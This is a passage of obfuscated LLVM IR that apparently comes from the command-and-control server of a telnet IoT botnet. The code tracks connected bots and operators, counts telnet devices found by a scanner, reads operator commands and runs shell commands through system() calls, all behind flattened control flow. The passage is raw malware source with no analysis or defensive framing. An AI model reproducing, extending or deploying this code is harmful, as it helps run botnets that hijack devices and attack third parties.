  %186 = load i8*, i8** %3, align 8
  %187 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %186) #7
  %188 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %188, i8 0, i64 2048, i32 16, i1 false)
  %189 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %190 = call i32 (i8*, i8*, ...) @sprintf(i8* %189, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.26, i32 0, i32 0)) #7
  %191 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %192 = call i32 (i8*, i8*, ...) @sprintf(i8* %191, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.27, i32 0, i32 0)) #7
  %193 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %194 = call i32 (i8*, i8*, ...) @sprintf(i8* %193, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.28, i32 0, i32 0)) #7
  %195 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %196 = call i32 (i8*, i8*, ...) @sprintf(i8* %195, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.29, i32 0, i32 0)) #7
  %197 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %198 = call i32 (i8*, i8*, ...) @sprintf(i8* %197, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.30, i32 0, i32 0)) #7
  %199 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %200 = call i32 (i8*, i8*, ...) @sprintf(i8* %199, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.31, i32 0, i32 0)) #7
  %201 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %202 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.32, i32 0, i32 0)) #7
  %203 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %204 = load i32, i32* %5, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %205
  %207 = getelementptr inbounds %struct.login_info, %struct.login_info* %206, i32 0, i32 0
  %208 = getelementptr inbounds [20 x i8], [20 x i8]* %207, i32 0, i32 0
  %209 = call i32 (i8*, i8*, ...) @sprintf(i8* %203, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.33, i32 0, i32 0), i8* %208) #7
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %211 = call i32 @BotsConnected()
  %212 = load volatile i32, i32* @OperatorsConnected, align 4
  %213 = call i32 (i8*, i8*, ...) @sprintf(i8* %210, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.34, i32 0, i32 0), i32 %211, i32 %212) #7
  %214 = load i32, i32* %4, align 4
  %215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %216 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %217 = call i64 @strlen(i8* %216) #8
  %218 = call i64 @send(i32 %214, i8* %215, i64 %217, i32 16384)
  %219 = icmp eq i64 %218, -1
  %220 = select i1 %219, i32 -1007576152, i32 -307302685
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i32, i32* %4, align 4
  %224 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %225 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %226 = call i64 @strlen(i8* %225) #8
  %227 = call i64 @send(i32 %223, i8* %224, i64 %226, i32 16384)
  %228 = icmp eq i64 %227, -1
  %229 = select i1 %228, i32 -1326750103, i32 704427525
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i32, i32* %4, align 4
  %233 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %235 = call i64 @strlen(i8* %234) #8
  %236 = call i64 @send(i32 %232, i8* %233, i64 %235, i32 16384)
  %237 = icmp eq i64 %236, -1
  %238 = select i1 %237, i32 -299103065, i32 -1740490019
  store i32 %238, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i32, i32* %4, align 4
  %242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %243 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %244 = call i64 @strlen(i8* %243) #8
  %245 = call i64 @send(i32 %241, i8* %242, i64 %244, i32 16384)
  %246 = icmp eq i64 %245, -1
  %247 = select i1 %246, i32 -1035000407, i32 -965624172
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %4, align 4
  %251 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %252 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %253 = call i64 @strlen(i8* %252) #8
  %254 = call i64 @send(i32 %250, i8* %251, i64 %253, i32 16384)
  %255 = icmp eq i64 %254, -1
  %256 = select i1 %255, i32 716435642, i32 -1140161680
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %4, align 4
  %260 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %261 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %262 = call i64 @strlen(i8* %261) #8
  %263 = call i64 @send(i32 %259, i8* %260, i64 %262, i32 16384)
  %264 = icmp eq i64 %263, -1
  %265 = select i1 %264, i32 1840495497, i32 -372206897
  store i32 %265, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i32, i32* %4, align 4
  %269 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %271 = call i64 @strlen(i8* %270) #8
  %272 = call i64 @send(i32 %268, i8* %269, i64 %271, i32 16384)
  %273 = icmp eq i64 %272, -1
  %274 = select i1 %273, i32 -1975842501, i32 -745882434
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load i32, i32* %4, align 4
  %278 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %279 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %280 = call i64 @strlen(i8* %279) #8
  %281 = call i64 @send(i32 %277, i8* %278, i64 %280, i32 16384)
  %282 = icmp eq i64 %281, -1
  %283 = select i1 %282, i32 -1403676174, i32 501022389
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 -773387133, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i32, i32* %4, align 4
  %288 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %289 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %290 = call i64 @strlen(i8* %289) #8
  %291 = call i64 @send(i32 %287, i8* %288, i64 %290, i32 16384)
  %292 = icmp eq i64 %291, -1
  %293 = select i1 %292, i32 1670986208, i32 1908615296
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %4, align 4
  %297 = call i64 @send(i32 %296, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i32 0, i32 0), i64 12, i32 16384)
  %298 = icmp eq i64 %297, -1
  %299 = select i1 %298, i32 -2045662619, i32 -1927078366
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 1233201185, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 -565320420, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8*, i8** %3, align 8
  %304 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %303) #7
  %305 = load i32, i32* %4, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %306
  %308 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %307, i32 0, i32 0
  store i32 1, i32* %308, align 4
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %311 = load i32, i32* %4, align 4
  %312 = call i32 @fdgets(i8* %310, i32 2048, i32 %311)
  %313 = icmp sgt i32 %312, 0
  %314 = select i1 %313, i32 1050394633, i32 1005861982
  store i32 %314, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %317 = call i8* @strstr(i8* %316, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %318 = icmp ne i8* %317, null
  %319 = select i1 %318, i32 -581977341, i32 1526942277
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %322 = call i32 @BotsConnected()
  %323 = load volatile i32, i32* @OperatorsConnected, align 4
  %324 = call i32 (i8*, i8*, ...) @sprintf(i8* %321, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i32 0, i32 0), i32 %322, i32 %323) #7
  %325 = load i32, i32* %4, align 4
  %326 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %328 = call i64 @strlen(i8* %327) #8
  %329 = call i64 @send(i32 %325, i8* %326, i64 %328, i32 16384)
  %330 = icmp eq i64 %329, -1
  %331 = select i1 %330, i32 1165039884, i32 1233444916
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 1719111952, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %336 = call i8* @strstr(i8* %335, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0)) #8
  %337 = icmp ne i8* %336, null
  %338 = select i1 %337, i32 214223961, i32 224631938
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %341 = load volatile i32, i32* @TELFound, align 4
  %342 = load volatile i32, i32* @scannerreport, align 4
  %343 = call i32 (i8*, i8*, ...) @sprintf(i8* %340, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %341, i32 %342) #7
  %344 = load i32, i32* %4, align 4
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %347 = call i64 @strlen(i8* %346) #8
  %348 = call i64 @send(i32 %344, i8* %345, i64 %347, i32 16384)
  %349 = icmp eq i64 %348, -1
  %350 = select i1 %349, i32 184645373, i32 122528963
  store i32 %350, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 1719111952, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %355 = call i8* @strstr(i8* %354, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0)) #8
  %356 = icmp ne i8* %355, null
  %357 = select i1 %356, i32 1592298091, i32 1860873872
  store i32 %357, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %360 = call i32 @BotsConnected()
  %361 = load volatile i32, i32* @OperatorsConnected, align 4
  %362 = call i32 (i8*, i8*, ...) @sprintf(i8* %359, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i32 0, i32 0), i32 %360, i32 %361) #7
  %363 = load i32, i32* %4, align 4
  %364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i32 0, i32 0
  %366 = call i64 @strlen(i8* %365) #8
  %367 = call i64 @send(i32 %363, i8* %364, i64 %366, i32 16384)
  %368 = icmp eq i64 %367, -1
  %369 = select i1 %368, i32 60751410, i32 1688869046
  store i32 %369, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 1719111952, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %373 = load volatile i32, i32* @TELFound, align 4
  %374 = load volatile i32, i32* @scannerreport, align 4
  %375 = call i32 (i8*, i8*, ...) @sprintf(i8* %372, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %373, i32 %374) #7
  %376 = load i32, i32* %4, align 4
  %377 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %378 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %379 = call i64 @strlen(i8* %378) #8
  %380 = call i64 @send(i32 %376, i8* %377, i64 %379, i32 16384)
  %381 = icmp eq i64 %380, -1
  %382 = select i1 %381, i32 1576982613, i32 985566904
  store i32 %382, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 1719111952, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0)) #8
  %388 = icmp ne i8* %387, null
  %389 = select i1 %388, i32 -1448012285, i32 998327500
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  %393 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %394 = call i8* @strstr(i8* %393, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #8
  %395 = icmp ne i8* %394, null
  %396 = select i1 %395, i32 1781634984, i32 2010998829
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.44, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %401 = call i8* @strstr(i8* %400, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0)) #8
  %402 = icmp ne i8* %401, null
  %403 = select i1 %402, i32 663226093, i32 1009858078
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = call i32 @system(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.46, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %408 = call i8* @strstr(i8* %407, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0)) #8
  %409 = icmp ne i8* %408, null
  %410 = select i1 %409, i32 1158734567, i32 340336130
  store i32 %410, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.48, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %415 = call i8* @strstr(i8* %414, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i32 0, i32 0)) #8
  %416 = icmp ne i8* %415, null
  %417 = select i1 %416, i32 1099175096, i32 1613591941
  store i32 %417, i32* %switchVar
  br label %loopEnd

; <label>:418:                                    ; preds = %loopEntry
  %419 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.50, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %422 = call i8* @strstr(i8* %421, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.51, i32 0, i32 0)) #8
  %423 = icmp ne i8* %422, null
  %424 = select i1 %423, i32 -2042449070, i32 -1391400219
  store i32 %424, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  %426 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.52, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %429 = call i8* @strstr(i8* %428, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.53, i32 0, i32 0)) #8
  %430 = icmp ne i8* %429, null
  %431 = select i1 %430, i32 -566395118, i32 2100408553
  store i32 %431, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.54, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %436 = call i8* @strstr(i8* %435, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0)) #8
  %437 = icmp ne i8* %436, null
  %438 = select i1 %437, i32 1300704866, i32 166822699
  store i32 %438, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.56, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  %442 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %443 = call i8* @strstr(i8* %442, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %444 = icmp ne i8* %443, null
  %445 = select i1 %444, i32 701719937, i32 -570302131
  store i32 %445, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.58, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %450 = call i8* @strstr(i8* %449, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %451 = icmp ne i8* %450, null
  %452 = select i1 %451, i32 -1842103217, i32 -441470939
  store i32 %452, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.60, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %457 = call i8* @strstr(i8* %456, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0)) #8
  %458 = icmp ne i8* %457, null
  %459 = select i1 %458, i32 -585210992, i32 2061479409
  store i32 %459, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.62, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:462:                                    ; preds = %loopEntry
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %464 = call i8* @strstr(i8* %463, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i32 0, i32 0)) #8
  %465 = icmp ne i8* %464, null
  %466 = select i1 %465, i32 1370677512, i32 332356035
  store i32 %466, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.64, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %471 = call i8* @strstr(i8* %470, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i32 0, i32 0)) #8
  %472 = icmp ne i8* %471, null
  %473 = select i1 %472, i32 1061812264, i32 -1243738250
  store i32 %473, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  %475 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.66, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %478 = call i8* @strstr(i8* %477, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i32 0, i32 0)) #8
  %479 = icmp ne i8* %478, null
  %480 = select i1 %479, i32 -1873717310, i32 -1437196163
  store i32 %480, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.68, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %485 = call i8* @strstr(i8* %484, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0)) #8
  %486 = icmp ne i8* %485, null
  %487 = select i1 %486, i32 -1904691242, i32 516049006
  store i32 %487, i32* %switchVar
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  %489 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.70, i32 0, i32 0))
  store i32 2121039026, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %492 = call i8* @strstr(i8* %491, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #8
  %493 = icmp ne i8* %492, null
  %494 = select i1 %493, i32 930107762, i32 -1639971546
  store i32 %494, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load i8*, i8** %3, align 8
  %497 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %496) #7
  %498 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i32 0, i32 0
  %499 = call i32 (i8*, i8*, ...) @sprintf(i8* %498, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.72, i32 0, i32 0)) #7
  %500 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i32 0, i32 0
  %501 = call i32 (i8*, i8*, ...) @sprintf(i8* %500, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.73, i32 0, i32 0)) #7
  %502 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %503 = call i32 (i8*, i8*, ...) @sprintf(i8* %502, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.74, i32 0, i32 0)) #7
  %504 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %505 = call i32 (i8*, i8*, ...) @sprintf(i8* %504, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.75, i32 0, i32 0)) #7
  %506 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %507 = call i32 (i8*, i8*, ...) @sprintf(i8* %506, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.76, i32 0, i32 0)) #7
  %508 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %509 = call i32 (i8*, i8*, ...) @sprintf(i8* %508, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.77, i32 0, i32 0)) #7
  %510 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %511 = call i32 (i8*, i8*, ...) @sprintf(i8* %510, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.78, i32 0, i32 0)) #7
  %512 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %513 = call i32 (i8*, i8*, ...) @sprintf(i8* %512, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.79, i32 0, i32 0)) #7
  %514 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %515 = call i32 (i8*, i8*, ...) @sprintf(i8* %514, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.80, i32 0, i32 0)) #7
  %516 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %517 = call i32 (i8*, i8*, ...) @sprintf(i8* %516, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.81, i32 0, i32 0)) #7
  %518 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %519 = call i32 (i8*, i8*, ...) @sprintf(i8* %518, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.82, i32 0, i32 0)) #7
  %520 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %521 = call i32 (i8*, i8*, ...) @sprintf(i8* %520, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.83, i32 0, i32 0)) #7
  %522 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %523 = call i32 (i8*, i8*, ...) @sprintf(i8* %522, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.84, i32 0, i32 0)) #7
  %524 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %525 = call i32 (i8*, i8*, ...) @sprintf(i8* %524, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.85, i32 0, i32 0)) #7
  %526 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %527 = call i32 (i8*, i8*, ...) @sprintf(i8* %526, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.86, i32 0, i32 0)) #7
  %528 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
